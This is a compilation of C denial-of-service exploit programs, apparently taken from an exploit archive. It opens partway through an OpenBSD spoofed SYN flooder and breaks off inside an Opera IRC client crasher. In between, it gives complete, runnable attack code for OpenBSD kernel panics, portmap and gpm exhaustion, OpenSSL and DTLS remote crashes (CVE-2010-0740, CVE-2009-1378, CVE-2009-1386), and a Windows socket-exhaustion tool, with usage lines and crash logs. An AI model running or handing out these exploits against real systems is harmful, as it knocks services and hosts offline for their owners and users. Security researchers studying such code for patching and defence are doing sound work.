 * add's ipv4-header of 20 bytes without any options
 * - IPPROTO_TCP and 40 bytes total length
 */
void
add_iphdr(unsigned char *pkt, struct net_tuple *nt)
{
  struct ip                     ip;

  memset(&ip, 0, 20); 
  ip.ip_hl = sizeof(ip) >> 2;
  ip.ip_v = 4;
  /*ip->tos = 0;*/
  ip.ip_len = htons(IP_SIZE + TCP_SIZE);  /* htons ? */
  /*ip->id = 0;                  done by kernel */
  /*ip->frag_off = 0;*/
  ip.ip_ttl = 0xff;
  ip.ip_p = IPPROTO_TCP;        
  /*.ip->check = 0;      done by kernel */
  ip.ip_src.s_addr = nt->src;
  ip.ip_dst.s_addr = nt->dst;
  memcpy(pkt, &ip, sizeof(ip));
}


/*
 * send out ipv4-packet
 * with data 'pkt' of length 'len'
 * returns the number of characters sent, or -1 if an error occured
 */
int
send_ipv4(int sox, u_char  *pkt, size_t len)
{
   struct sockaddr_in   to;

   to.sin_family = AF_INET;
   memcpy(&to.sin_addr.s_addr, (pkt + 4*4), sizeof(u_long));

   return(sendto(sox, pkt, len, 0 , (struct sockaddr *)&to, sizeof(to)) );
}

/*
 * for a local DoS.
 * we use udp this time [much easier, much faster, but only local:)]
 */
void
local_dos(char *argv[])
{
  struct sockaddr_in saddr;
  int c=0;
  int sox;
  int iprunner;

  if( (sox = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
  {
     fprintf(stderr, "error creating socket\n");
     exit(1);
  }

  memset(&saddr, 0, sizeof(saddr));
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(31337);
  iprunner = ntohl(inet_addr(argv[1]));

  while (c++< atoi(argv[2]))
  {
    saddr.sin_addr.s_addr = htonl(iprunner++);
    sendto(sox, NULL, 0, 0, (struct sockaddr *)&saddr, sizeof(saddr));
  }

  printf("not working ?! wtf ! mailme asap anonymous@segfault.net\n");
  exit(0);

}


void
usage(int code)
{
  printf("\n4local  DoS:\n");
  printf("obsd_fun <network> <count>\n");
  printf("    obsd_fun 10.23.0.1 32000\n\n");
  printf("4 remote DoS:\n");
  printf("obsd_fun <target_ip> <network> <count>\n");
  printf("    obsd_fun 10.23.13.37 10.23.0.1 65000\n\n");
  exit(code);
}

int
main(int argc, char *argv[])
{
  struct net_tuple nt;
  int sox;
  int on = 1;
  unsigned long iprunner;
  int c=0;

  if (argc < 3)
     usage(0);
  if (argc == 3)
     local_dos(argv);

  memset(&nt, 0, sizeof(nt));

  if( (sox = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
  {
     fprintf(stderr, "error creating socket\n");
     exit(1);
  }
  if (setsockopt(sox, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
  {
     fprintf(stderr, "error setsockopt\n");
     exit(1);
  }

  printf("nuking %s on network %s with %d ip's\n",
                                         argv[1], argv[2], atoi(argv[3]));

  nt.dport = htons(31337);
  nt.sport = htons(31338);
  if ( (nt.dst = inet_addr(argv[1])) == -1)
  {
    fprintf(stderr, "nah. use IP insteat of hostname.\n");
    exit(0);
  }
  iprunner = ntohl(inet_addr(argv[2]));
  memset(packet, 0 , sizeof(packet));

  while (c++< atoi(argv[3]))
  {
    nt.src = htonl(iprunner++);
    add_tcphdr(packet + ETH_SIZE + IP_SIZE, &nt, TH_SYN);
    add_iphdr(packet + ETH_SIZE, &nt);
    send_ipv4(sox, packet + ETH_SIZE, IP_SIZE + TCP_SIZE);
  }

 printf("done. Try an endless loop if box is still alive.\n");
 return(0);
} 
source: http://www.securityfocus.com/bid/9073/info

A denial of service vulnerability has been reported for OpenBSD, specifically when handling malformed calls to sysctl. By invoking systcl and passing a specific flag in conjunction with a negative argument may trigger a kernel panic. This could be exploited by a malicious unprivileged local user to crash a target system.

The precise technical details regarding this vulnerability are currently unknown. This BID will be updated as further information is made available. 

#include <stdio.h>
#include <sys/param.h>
#include <sys/sysctl.h>

int main ()
{
unsigned int blah[2] = { CTL_KERN, 0 }, addr = -4096 + 1;

return (sysctl (blah, 2, (void *) addr, &blah[1], 0, 0));
} /*
 * OpenBSD 4.2 rtlabel_id2name() [SIOCGIFRTLABEL ioctl]
 * Null Pointer Dereference local Denial of Service Exploit
 *
 * by Hunger <rtlabdos@hunger.hu>
 *
 * Advisory:
 * http://marc.info/?l=openbsd-security-announce&m=120007327504064
 *
 * FOR TESTING PURPOSES ONLY!
 *
 * $ uname -mrsv
 * OpenBSD 4.2 GENERIC#375 i386
 * $ id
 * uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)
 * $ ftp -V http://hunger.hu/rtlabdos.c
 * 100% |******************************************|  1814        00:00
 * $ gcc rtlabdos.c -o rtlabdos
 * $ ./rtlabdos
 * uvm_fault(0xd617865e0, 0x0, 0, 1) -> e
 * kernel: page fault trap, code=0
 * Stopped at      strlcpy+0x1c:    movb     0(%edx),%al
 * ddb> trace
 * strlcpy(d826fd98,0,20,6,d61772a0) at strlcpy+0x1c
 * ifioctl(d6033280,c0206983,d826fe78,d616696c,d61772a0) at ifioctl+0xa0d
 * sys_ioctl(d616696c,d826ff68,d826ff58,1c000680,73) at sys_ioctl+0x125
 * syscall() at syscall+0x24a
 * --- syscall (number 54) ---
 * 0xf557d1:
 * ddb> show registers
 * ds                  0x10
 * es                  0x10
 * fs                  0x58
 * gs                  0x10
 * edi                    0
 * esi                 0x20
 * ebp           0xd826fd60        end+0x7a33a90
 * ebx           0xd826fd98        end+0x7a33ac8
 * edx                    0
 * ecx                 0x1f
 * eax                    0
 * eip           0xd064acb0        strlcpy+0x1c
 * cs                   0x8
 * eflags           0x10212
 * esp           0xd826fd54        end+0x7a33a84
 * ss            0xd8260010        end+0x7a23d40
 * strlcpy+0x1c:   movb    0(%edx),%al
 * 
 */

#include <sys/param.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>

int
main(void)
{
struct ifreq ifr = { .ifr_name = "lo0" };

return ioctl(socket(AF_INET, SOCK_DGRAM, 0), SIOCGIFRTLABEL, &ifr);
}

// milw0rm.com [2008-01-18]
source: http://www.securityfocus.com/bid/56671/info

OpenBSD is prone to a remote denial-of-service vulnerability.

Successful exploits may allow the attacker to cause the application to crash, resulting in denial-of-service conditions.

OpenBSD versions prior to 5.2 are vulnerable. 

/*
 * authors: 22733db72ab3ed94b5f8a1ffcde850251fe6f466
 *          6e2d3d47576f746e9e65cb4d7f3aaa1519971189
 *          c8e74ebd8392fda4788179f9a02bb49337638e7b
 * 
 *  greetz: 43c86fd24bd63b100891ec4b861665e97230d6cf
 *          e4c0f3f28cf322779375b71f1c14d6f8308f789d
 *          691cb088c45ec9e31823ca7ab0da8b4cf8079baf
 *          b234a149e7ef00abc0f2ec7e6cf535ef4872eabc
 *
 *
 * -bash-4.2$ uname -a
 * OpenBSD obsd.my.domain 5.1 GENERIC#160 i386
 * -bash-4.2$ id
 * uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)
 * -bash-4.2$ netstat -an -f inet | grep 111
 * tcp          0      0  127.0.0.1.111          *.*                    LISTEN
 * tcp          0      0  *.111                  *.*                    LISTEN
 * udp          0      0  127.0.0.1.111          *.*
 * udp          0      0  *.111                  *.*
 * -bash-4.2$ gcc openbsd_libc_portmap.c
 * -bash-4.2$ ./a.out
 * [+] This code doesn't deserve 1337 status output.
 * [+] Trying to crash portmap on 127.0.0.1:111
 * [+] 127.0.0.1:111 is now down.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define HOST "127.0.0.1"
#define PORT 111
#define LOOP 0x100


int main(void)
{
    int s, i;
    struct sockaddr_in saddr;

    printf("[+] This code doesn't deserve 1337 status output.\n");
    printf("[+] Trying to crash portmap on %s:%d\n", HOST, PORT);

    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(PORT);
    saddr.sin_addr.s_addr = inet_addr(HOST);

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(connect(s, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in)) == -1) {
        printf("[-] %s:%d is already down.\n", HOST, PORT);
        return EXIT_FAILURE;
    }

    /* # of iteration needed varies but starts working for > 0x30  */
    for(i=0; i < LOOP; ++i) {
        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(s, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in));
        send(s, "8========@", 10, 0);
    }

    if(connect(s, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in)) == -1)
        printf("[+] %s:%d is now down.\n", HOST, PORT);
    else
        printf("[-] %s:%d is still listening. Try to increase loop iterations...\n");

    return EXIT_SUCCESS;
}source: http://www.securityfocus.com/bid/1377/info

gpm is a program that allows Linux users to use the mouse in virtual consoles. It communicates with a device, /dev/gpmctl, via unix domain STREAM sockets and is vulnerable to a locally exploitable denial of service attack. If a malicious user makes too many connections to the device, it will hang and gpm will not function. RedHat 6.1 is confirmed to be vulnerable. It is not known what other linux distributions may also be vulnerable. 

// FuckGpm    CADENCE of Lam3rZ    1999.11.23

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#define GDZIE    "/dev/gpmctl"
#define POLACZENIA 200
#define SHITY   10000


int main (void)
{
 int a,b;
 struct sockaddr_un sun;

 sun.sun_family = AF_UNIX;
 strncpy (sun.sun_path, GDZIE, 30);
 printf ("OK...\n");

 if (fork ())
  exit (0);

 for (b = 0; b < SHITY; b++)
  if (fork () == 0)
  break;

 for (b = 0; b < POLACZENIA; b++)
  {
   if ((a = socket (AF_UNIX, SOCK_STREAM, 0)) < 0)
    {
     perror ("socket");
     while (1);
   }

  if (connect (a, (struct sockaddr *) &sun, sizeof (struct sockaddr)) < 0)
   {
    perror ("connect");
    close (a);
    b--;
   }
  }

 while (1);
}
/***********************************************************
 * hoagie_openssl_record_of_death.c
 * OPENSSL REMOTE DENIAL-OF-SERVICE EXPLOIT 
 * - OpenSSL 0.9.8m (short = 16 bit)
 * - OpenSSL 0.9.8f through 0.9.8m (short != 16 bit)
 *
 * CVE-2010-0740
 *
 * Bug discovered by:
 * Bodo Moeller and Adam Langley (Google)
 * Philip Olausson <po@secweb.se>
 * http://openssl.org/news/secadv_20100324.txt
 *
 * The main problem is in ssl/t1_enc.c => tls1_mac() function
 *
 * - OpenSSL 0.9.8m
 *         if (ssl->version == DTLS1_BAD_VER ||
 *           (ssl->version == DTLS1_VERSION && ssl->client_version != DTLS1_BAD_VER))
 *               {
 *               unsigned char dtlsseq[8],*p=dtlsseq;
 *               s2n(send?ssl->d1->w_epoch:ssl->d1->r_epoch, p);
 *
 * - OpenSSL 0.9.8f - 0.9.8n
 *         if (ssl->version == DTLS1_VERSION && ssl->client_version != DTLS1_BAD_VER)
 *               {
 *               unsigned char dtlsseq[8],*p=dtlsseq;
 *
 *               s2n(send?ssl->d1->w_epoch:ssl->d1->r_epoch, p);
 *
 * There is a NULL pointer dereference => ssl->d1 because d1 is only initialized in
 * ssl/d1_lib.c => dtls1_new(). So if you use SSLv23_server_method() or 
 * TLSv1_server_method() this variable will be NULL.
 *
 * If the patch (see http://openssl.org/news/secadv_20100324.txt) is not applied
 * its possible to set the version to DTLS1_BAD_VER (0x100) or DTLS_VERSION (0xfeff)
 * and transmit the packet to the server or client to trigger the vulnerability.
 *
 * When you are using OpenSSL 0.9.8m you can send DTLS1_BAD_VER because 0x100 is not 
 * a problem with signed/unsigned.
 *
 * If you are using OpenSSL 0.9.8f to 0.9.8n you have to trigger the vulnerability
 * via DTLS1_VERSION. In that case version will be 0xfffffeff. So it doesnt work
 * if DTLS1_VERSION is 16 bit.
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
 * DAMAGE DONE USING THIS PROGRAM.
 *
 * VOID.AT Security
 * andi@void.at
 * http://www.void.at
 *
 ************************************************************/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>

/* usage
 * display help screen
 */
void usage(int argc, char **argv) {
   fprintf(stderr,
           "usage: %s [-h] [-v] [-d <host>] [-p <port>]\n"
           "\n"
           "-h        help\n"
           "-v        verbose\n"
           "-d host   SSL server\n"
           "-p port   SSL port\n"
           "-t target\n"
           "   0 ... OpenSSL 0.9.8m (short = 16 bit) - default\n"
           "   1 ... OpenSSL 0.9.8f through 0.9.8m (short != 16 bit)\n"
           ,
           argv[0]);
   exit(1);
}

/* connect_to
 * connect to remote http server
 */
int connect_to(char *host, int port) {
   struct sockaddr_in s_in;
   struct hostent *he;
   int s;

   if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
      return -1;
   }

   memset(&s_in, 0, sizeof(s_in));
   s_in.sin_family = AF_INET;
   s_in.sin_port = htons(port);

   if ( (he = gethostbyname(host)) != NULL)
       memcpy(&s_in.sin_addr, he->h_addr, he->h_length);
   else {
       if ( (s_in.sin_addr.s_addr = inet_addr(host) ) < 0) {
          return -3;
       }
   }

   if (connect(s, (struct sockaddr *)&s_in, sizeof(s_in)) == -1) {
      return -4;
   }

   return s;
}

/* ssl_connect_to
 * establish ssl connection over tcp connection
 */
SSL *ssl_connect_to(int s) {
   SSL *ssl;
   SSL_CTX *ctx;
   BIO *sbio;
   SSL_METHOD *meth;

   CRYPTO_malloc_init();
   SSL_load_error_strings();
   SSL_library_init();

   // meth = TLSv1_client_method();
   meth = SSLv23_client_method();
   ctx = SSL_CTX_new(meth);
   ssl = SSL_new(ctx);
   sbio = BIO_new_socket(s, BIO_NOCLOSE);
   SSL_set_bio(ssl, sbio, sbio);

   if (SSL_connect(ssl) <= 0) {
      return NULL;
   }

   return ssl;
}


int main(int argc, char **argv) {
   struct sockaddr_in s_in;
   struct hostent *he;
   char data[1024];

   int s;
   int target = 0;
   char c;
   char *destination = NULL;
   int port = 0;
   SSL *ssl = NULL;

   fprintf(stderr,
           "hoagie_openssl_record_of_death.c - openssl ssl3_get_record() remote\n"
           "-andi / void.at\n\n");

   if (argc < 2) {
      usage(argc, argv);
   } else {
      while ((c = getopt (argc, argv, "hd:p:t:")) != EOF) {
         switch (c) {
            case 'h':
                 usage(argc, argv);
                 break;
            case 'd':
                 destination = optarg;
                 break;
            case 'p':
                 port = atoi(optarg);
                 break;
            case 't':
                 target = atoi(optarg);
                 break;
         }
      }

      if (!destination || !port) {
         fprintf(stderr, "[*] destination and/or port missing\n");
      } else if (target && target != 1) {
         fprintf(stderr, "[*] invalid target '%d'\n", target);
      } else {
         s = connect_to(destination, port);
         if (s > 0) {
            fprintf(stderr, "[+] tcp connection to '%s:%d' successful\n", destination, port);
            ssl = ssl_connect_to(s);
            if (ssl) {
               fprintf(stderr, "[+] ssl connection to '%s:%d' successful\n", destination, port);
               snprintf(data, sizeof(data), "GET / HTTP/1.0\r\n\r\n");

               fprintf(stderr, "[+] sending first packet ...\n");
               SSL_write(ssl, data, strlen(data));

               if (!target) {
                  ssl->version = DTLS1_BAD_VER;
               } else {
                  ssl->version = DTLS1_VERSION;
               }

               fprintf(stderr, "[+] sending second paket ...\n");
               SSL_write(ssl, data, strlen(data));

               SSL_shutdown(ssl);
               close(s);

               sleep(1);

               s = connect_to(destination, port);
               if (s > 0) {
                  fprintf(stderr, "[-] exploit failed\n");
                  close(s);
               } else {
                  fprintf(stderr, "[+] exploit successful\n");
               }
            } else {
               fprintf(stderr, "[-] ssl connection to '%s:%d' failed\n", destination, port);
            }
         } else {
            fprintf(stderr, "[-] tcp connection to '%s:%d' failed\n", destination, port);
         }
      }
   }
   
   return 0;
}

/*
 * cve-2009-1378.c
 *
 * OpenSSL <= 0.9.8k, 1.0.0-beta2 DTLS Remote Memory Exhaustion DoS
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1378
 *
 *   In dtls1_process_out_of_seq_message() the check if the current message is 
 *   already buffered was missing. For every new message was memory allocated, 
 *   allowing an attacker to perform an denial of service attack with sending 
 *   out of seq handshake messages until there is no memory left.
 *
 * Usage:
 *
 *   Pass the host and port of the target DTLS server:
 *
 *   $ gcc cve-2009-1378.c -o cve-2009-1378
 *   $ ./cve-2009-1378 1.2.3.4 666
 *
 * Notes:
 *
 *   With a MTU of 1500, the attack leaks 1503 bytes of memory with each UDP
 *   datagram.  If you have a bigger MTU than 1500, feel free to set it.
 *
 *   Complete memory exhaustion may take a while depending on the throughput 
 *   to the target and the amount of memory it has.  By default, we'll just 
 *   continue sending datagrams indefinitely.
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#define MTU 1500

#define IP_HDR_LEN 20
#define UDP_HDR_LEN 8
#define MAX_LEN (MTU - IP_HDR_LEN - UDP_HDR_LEN)

#define put16(b, data) ( \
        (*(b) = ((data) >> 8) & 0xff), \
        (*((b)+1) = (data) & 0xff))

int
main(int argc, char **argv)
{
	int sock, ret;
	char *ptr, *err;
	struct hostent *h;
	struct sockaddr_in target;
	char buf[MAX_LEN];

	if (argc < 3) {
		err = "Pass the host and port of the target DTLS server";
		printf("[-] Error: %s\n", err);
		exit(1);
	}

	h = gethostbyname(argv[1]);
	if (!h) {
		err = "Unknown host specified";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	target.sin_family = h->h_addrtype;
	memcpy(&target.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
	target.sin_port = htons(atoi(argv[2]));

	sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		err = "Failed creating UDP socket";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	ret = connect(sock, (struct sockaddr *) &target, sizeof(target));
	if (ret == -1) {
		err = "Failed to connect socket";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	ptr = buf;

	/* header  */
	memcpy(ptr, "\x16\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00", 11);
	ptr += 11;

	/* packet length */
	put16(ptr, MAX_LEN - ((ptr - buf) + 2));
	ptr += 2;
	
	/* client hello */
	memcpy(ptr, "\x01", 1);
	ptr += 1;
	
	/* length */
	memcpy(ptr, "\x00", 1);
	ptr += 1;
	put16(ptr, MAX_LEN - ((ptr - buf) + 2 + 8));
	ptr += 2;

	/* sequence number */
	memcpy(ptr, "\x00\x01", 2);
	ptr += 2;

	/* frag offset */
	memcpy(ptr, "\x00\x00\x00", 3);
	ptr += 3;

	/* length */
	memcpy(ptr, "\x00", 1);
	ptr += 1;
	put16(ptr, MAX_LEN - ((ptr - buf) + 2));
	ptr += 2;

	/* payload */
	memset(ptr, '\x00', MAX_LEN - (ptr - buf));

	printf("[+] Firing loads of packets at %s:%s...\n", argv[1], argv[2]);

	while (1) {
		send(sock, buf, MAX_LEN, 0);
	}

	close(sock);

	return 0;
}

// milw0rm.com [2009-05-18]
/*
 * cve-2009-1386.c
 *
 * OpenSSL < 0.9.8i DTLS ChangeCipherSpec Remote DoS
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1386
 *
 *   OpenSSL would SegFault if the DTLS server receives a ChangeCipherSpec as
 *   the first record instead of ClientHello.
 *
 * Usage:
 *
 *   Pass the host and port of the target DTLS server:
 *
 *   $ gcc cve-2009-1386.c -o cve-2009-1386
 *   $ ./cve-2009-1386 1.2.3.4 666
 *
 * Notes:
 *
 *   Much easier than the memory exhaustion DoS issue (CVE-2009-1378) as this 
 *   only requires a single ChangeCipherSpec datagram, but affects an older 
 *   version of OpenSSL.
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

int
main(int argc, char **argv)
{
	int sock, ret;
	char *ptr, *err;
	struct hostent *h;
	struct sockaddr_in target;
	char buf[64];

	if (argc < 3) {
		err = "Pass the host and port of the target DTLS server";
		printf("[-] Error: %s\n", err);
		exit(1);
	}

	h = gethostbyname(argv[1]);
	if (!h) {
		err = "Unknown host specified";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	target.sin_family = h->h_addrtype;
	memcpy(&target.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
	target.sin_port = htons(atoi(argv[2]));

	sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		err = "Failed creating UDP socket";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	ret = connect(sock, (struct sockaddr *) &target, sizeof(target));
	if (ret == -1) {
		err = "Failed to connect socket";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	memcpy(buf, "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01", 14);

	printf("[+] Sending DTLS datagram of death at %s:%s...\n", argv[1], argv[2]);

	send(sock, buf, 14, 0);

	close(sock);

	return 0;
}

// milw0rm.com [2009-06-04]
/*
   http://secunia.com/advisories/13415
   written by dila
   released on 11.12.04
   compile with ms vc++
   remember to link with winsock
*/

#define WIN32_LEAN_AND_MEAN 
#include "windows.h"
#define IDD_MAIN                        101
#define IDI_MAIN                        103
#define IDC_SERV                        1000
#define IDC_SOCKS                       1002
#define IDHALT                          1004

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        104
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1005
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif // Combined resource.h - milw0rm.com
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>

#define WM_WSAASYNC (WM_USER +5)

BOOL CALLBACK DlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);
int startupClient(HWND hDlg);
void StopDoS();
void EnableDoSButton(HWND hDlg);
void DisableDoSButton(HWND hDlg);

struct hostent *host_entry;
struct sockaddr_in server;

WSAData wsaData;
char *request="POST /Search HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\nContent-Length: 291\nConnection: Keep-Alive\nCache-Control: no-cache\n\nCharSet=ISO-8859-1&FieldID%3A1211.0%3DLONG=0&FieldID%3A1202%3DSTRING=&FieldID%3A1208%3DCHECKBOX=on&FieldID%3A1206%3DCHECKBOX=on&FieldID%3A1204%3DCHECKBOX=on&FieldID%3A1207%3DCHECKBOX=on&FieldID%3A1205%3DCHECKBOX=on&FieldID%3A1209%3DCHECKBOX=on&FieldID%3A1212%3DCHECKBOX=on&Input%3A1211.0=+--\n\n";
char target[101];
__int64 timer;
int *mySocket, sockets=256, isDoS=0, sustain=0, count=0;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_MAIN), NULL, (DLGPROC)DlgProc, 0);
	return 0; 
}

BOOL CALLBACK DlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch(uMsg)
	{
		case WM_INITDIALOG:
			int error;
			if ((error = WSAStartup(MAKEWORD(2, 2), &wsaData)) == SOCKET_ERROR){ MessageBox(hDlg, "Could not initialize winsock! Try looking for a winsock update.", "Fatal Error", MB_OK|MB_ICONSTOP); SendMessage(hDlg, WM_CLOSE, 0, 0); }
			EnableDoSButton(hDlg);
			SetDlgItemText(hDlg, IDC_SERV, "");
			SetDlgItemInt(hDlg, IDC_SOCKS, 256, 0);
			return(false);
		case WM_COMMAND:
			if(wParam==IDOK)
			{
				DisableDoSButton(hDlg);
				EnableWindow(GetDlgItem(hDlg, IDHALT), 0);
				GetDlgItemText(hDlg, IDC_SERV, target, 100);
				sockets = GetDlgItemInt(hDlg, IDC_SOCKS, 0, 0);
				if(sockets<2){
					MessageBox(hDlg, "You need more sockets to cause a DoS!", "User Error", MB_OK|MB_ICONWARNING);
					EnableDoSButton(hDlg);
				}else if(strlen(target)<1){
					MessageBox(hDlg, "You need to specify a target!", "User Error", MB_OK|MB_ICONWARNING);
					EnableDoSButton(hDlg);
			}else if(!gethostbyname(target)){
					MessageBox(hDlg, "Unable to resolve target!", "DNS Error", MB_OK|MB_ICONWARNING);
					EnableDoSButton(hDlg);
				}else
				{
					DisableDoSButton(hDlg);
					host_entry = gethostbyname(target);
					server.sin_family = AF_INET;
					server.sin_port = htons(80);
					server.sin_addr.s_addr = *(unsigned long*) host_entry->h_addr;
					mySocket = (int*)realloc(mySocket, sizeof(int)*sockets);
					if(mySocket==NULL){
						mySocket = (int*)realloc(mySocket, sizeof(int)*sockets);
						if(mySocket==NULL){
							SetFocus(hDlg);
							MessageBox(hDlg, "Too many sockets and not enough memory.", "Memory allocation failed!", MB_OK|MB_ICONWARNING);
							EnableDoSButton(hDlg);
						}
					}else{
						memset(mySocket, 0, sizeof(mySocket));
						isDoS=1;
						PostMessage(hDlg, WM_WSAASYNC, 0, 0);
					}
				}
			}else if(wParam==IDHALT)
			{
				sustain=0;
				count=0;
				isDoS=0;
				StopDoS();
				EnableDoSButton(hDlg);
				SetFocus(hDlg);
				StopDoS();
				MessageBox(hDlg, "All sockets have been shutdown!", "Information", MB_OK|MB_ICONINFORMATION);
			}
			return(false);
		case WM_CLOSE:
			WSACleanup();
			DestroyWindow(hDlg);
			return(true);
		case WM_WSAASYNC:
			if(isDoS)
			{
				mySocket[count] = startupClient(hDlg);
				SetDlgItemInt(hDlg, IDC_SOCKS, sockets-count, 0);
				if(count<sockets) count++;
				else{
					count=0;
					isDoS=0;
					sustain=1;
					EnableWindow(GetDlgItem(hDlg, IDHALT), 0);
					SetFocus(hDlg);
					MessageBox(hDlg, "DoS in progress! Click OK to release sockets.", "Information", MB_OK|MB_ICONINFORMATION);
					PostMessage(hDlg, WM_COMMAND, IDHALT, 0);
				}
			}else if(sustain==1)
			{
				if(GetTickCount()>timer)
				{
					int fcount;
					for(fcount=0; fcount<sockets+1; fcount++) if(mySocket[fcount]==0) break;
					if(fcount==sockets && mySocket[fcount]!=0)
					{
						MessageBox(hDlg, "all sockets where disconnected!", "DEBUG", MB_OK);
					}else{
						mySocket[fcount] = startupClient(hDlg);
					}
					timer=GetTickCount()+1000;
				}
			}
			if(WSAGETSELECTEVENT(lParam)==FD_CONNECT)
			{
				send(wParam, request, strlen(request), 0);
			}else if(WSAGETSELECTEVENT(lParam)==FD_CLOSE)
			{
				if(isDoS)
				{
					int icount;
					for(icount=0; icount<sockets+1; icount++) if((unsigned int)mySocket[icount]==wParam) break;
					closesocket(wParam);
					mySocket[icount] = startupClient(hDlg);
				}else if(sustain)
				{
					int icount;
					for(icount=0; icount<sockets+1; icount++) if((unsigned int)mySocket[icount]==wParam) break;
					closesocket(wParam);
					mySocket[icount] = startupClient(hDlg);
				}
			}
	}
	return(false);
}

int startupClient(HWND hDlg) {
	int tmpSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (tmpSocket == SOCKET_ERROR) return 0;
	WSAAsyncSelect(tmpSocket, hDlg, WM_WSAASYNC, FD_CONNECT|FD_CLOSE);
	int error = connect(tmpSocket, (sockaddr*)&server, sizeof(server));
	if(error) tmpSocket=0;
	return tmpSocket;
}

void StopDoS()
{
	int hcount;
	for(hcount=0; hcount<sockets+1; hcount++) closesocket(mySocket[hcount]);
}

void EnableDoSButton(HWND hDlg)
{
	EnableWindow(GetDlgItem(hDlg, IDHALT), 0);
	EnableWindow(GetDlgItem(hDlg, IDC_SERV), 1);
	EnableWindow(GetDlgItem(hDlg, IDC_SOCKS), 1);
	EnableWindow(GetDlgItem(hDlg, IDOK), 1);
}

void DisableDoSButton(HWND hDlg)
{
	EnableWindow(GetDlgItem(hDlg, IDOK), 0);
	EnableWindow(GetDlgItem(hDlg, IDC_SERV), 0);
	EnableWindow(GetDlgItem(hDlg, IDC_SOCKS), 0);
	EnableWindow(GetDlgItem(hDlg, IDHALT), 1);
}

// milw0rm.com [2004-12-15]
/* 
 * Opera 9 IRC client DOS exploit
 * by Preddy and NNP
 *
 * http://www.smashthestack.org
 * http://silenthack.co.uk
 * http://www.team-rootshell.com
 *
 * 12 August 2006
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>

#define MYPORT 6667    

#define BACKLOG 10     

// : KICK\r\n

char die[] = {
    0x3a, 0x20, 0x4b, 0x49, 0x43, 0x4b, 0x0d, 0x0a, 0x00 };

void sigchld_handler(int s)
{
    while(waitpid(-1, NULL, WNOHANG) > 0);
}

int main(void)
{
    int sockfd, new_fd;  
    struct sockaddr_in my_addr;    
    struct sockaddr_in their_addr; 
    socklen_t sin_size;
    struct sigaction sa;
    int yes=1;

    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }

